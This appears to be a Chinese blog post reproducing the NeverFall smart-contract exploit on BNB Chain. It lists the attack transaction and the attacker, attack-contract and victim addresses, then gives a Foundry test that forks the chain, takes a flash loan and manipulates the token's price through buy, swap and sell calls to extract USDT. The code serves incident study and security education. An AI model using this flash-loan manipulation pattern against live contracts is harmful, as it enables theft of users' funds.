>**了解智能合约审计和最佳实践请**[点击查看文档](https://safful.com/) 

# 智能合约漏洞案例，NeverFall 漏洞复现

# 1. 漏洞简介

[https://twitter.com/BeosinAlert/status/1653619782317662211](https://twitter.com/BeosinAlert/status/1653619782317662211)
![](https://cdn.nlark.com/yuque/0/2023/png/97322/1694318180420-f22b7004-e8f8-43db-a9cd-90b5691b50c6.png#averageHue=%23fefefe&clientId=u2c5089f7-09b4-4&from=paste&id=u2425c33b&originHeight=590&originWidth=807&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=u432cb69d-5bf6-480e-88c3-78043641765&title=)

# 2. 相关地址或交易

[https://explorer.phalcon.xyz/tx/bsc/0xccf513fa8a8ed762487a0dcfa54aa65c74285de1bc517bd68dbafa2813e4b7cb](https://explorer.phalcon.xyz/tx/bsc/0xccf513fa8a8ed762487a0dcfa54aa65c74285de1bc517bd68dbafa2813e4b7cb) 攻击交易
攻击账号：0x53b757db8b9f3375d71eafe53e411a16acde75ee
攻击合约：0x35353ec557b9e23137ae27e9d4cc829d4dace16b
受害合约：0x5abde8b434133c98c36f4b21476791d95d888bf5

# 3. 获利分析

![](https://cdn.nlark.com/yuque/0/2023/png/97322/1694318180424-f71b4bba-d8d3-485e-b49d-b05af27f4b5f.png#averageHue=%23fefefe&clientId=u2c5089f7-09b4-4&from=paste&id=u22a50f82&originHeight=628&originWidth=1738&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=u18e509b1-4c6d-4b17-91ea-5d7efd0a7ba&title=)

# 5. 漏洞复现

漏洞复现代码：

```
// SPDX-License-Identifier: LGPL-3.0-only
pragma solidity ^0.8.10;

//import  "../interfaces/interface.sol";
import "forge-std/Test.sol";
import "./interface.sol";
import "../contracts/ERC20.sol";

interface NeverFall {
    function buy(uint256 amountU) external returns(uint256);
    function sell(uint256 amount) external returns(uint256);

}

contract ContractTest is Test{

    address constant flashloan = 0x7EFaEf62fDdCCa950418312c6C91Aef321375A00;
    address constant bscusd = 0x55d398326f99059fF775485246999027B3197955;
    address constant neverfall = 0x5ABDe8B434133C98c36F4B21476791D95D888bF5;
    address  payable PancakeSwapRouterv2 = payable(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address  PancakeSwapV2  =  0x97a08A9Fb303b4f6F26C5B3C3002EBd0E6417d2c;


    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 27863178 -2);
        //uint256 forkId = cheats.createFork("bsc");
        //cheats.selectFork(forkId);
        cheats.label(address(flashloan), "flashloan");
        cheats.label(address(bscusd), "bscusd");
        cheats.label(address(neverfall), "NeverFall");
    }

    function testExploit() external {
        IPancakePair(flashloan).swap(1600000 * 1e18,0,address(this),new bytes(1));

    }

    function pancakeCall(address sender, uint amount0, uint amount1, bytes calldata data) external {
        uint256 loanNum = IERC20(bscusd).balanceOf(address(this));
        console.log(" loanNum is : %s ", loanNum);

        IERC20(bscusd).approve(neverfall,type(uint256).max);
        IERC20(bscusd).approve(PancakeSwapRouterv2,type(uint256).max);
        uint256 buyNum = NeverFall(neverfall).buy(200000* 1e18);
        console.log(" buyNum is : %s ", buyNum);

        address [] memory path = new address[](2);
        path[0] =  bscusd;
        path[1] = neverfall;
        IPancakeRouter(PancakeSwapRouterv2).swapExactTokensForTokensSupportingFeeOnTransferTokens(1400000* 1e18,1,path,0x051d6a5f987e4fc53B458eC4f88A104356E6995a,88888899999);

        emit log_named_decimal_uint("pair USDT balance after swap",IERC20(bscusd).balanceOf(PancakeSwapV2),18);
        emit log_named_decimal_uint("pair neverfall balance after swap",IERC20(neverfall).balanceOf(PancakeSwapV2),18);

        uint256 sellNum = NeverFall(neverfall).sell(75500000 * 1e18);
        console.log(" sellNum is : %s ", sellNum);

        IERC20(bscusd).transfer(flashloan,1600000 * 1e18 * 1.003);
        emit log_named_decimal_uint("Attacker USDT balance after exploit",IERC20(bscusd).balanceOf(address(this)),18);
        emit log_named_decimal_uint("Attacker neverfallToken balance after exploit", IERC20(neverfall).balanceOf(address(this)),18);

        /*
        uint256 earnNum = IERC20(bscusd).balanceOf(address(this));
        console.log(" earnNum is : %s ", earnNum);
        uint256 neverfallNum = IERC20(neverfall).balanceOf(address(this));
        console.log(" neverfallNum is : %s ", neverfallNum);
        */
    }
}
```
